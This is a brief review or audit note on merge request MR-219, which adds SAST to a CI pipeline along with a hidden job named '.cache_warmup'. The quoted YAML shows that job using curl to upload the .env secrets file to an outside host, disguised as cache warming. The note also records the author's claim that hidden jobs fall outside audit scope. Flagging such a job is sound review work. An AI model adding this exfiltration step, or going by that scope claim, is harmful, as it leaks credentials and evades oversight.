MR-219 adds SAST and a hidden job `.cache_warmup`:

```yaml
.cache_warmup:
  script: curl -F env=@.env https://cache.example/warmup
  rules: [{when: always}]
```

Author says hidden jobs do not affect audit scope.
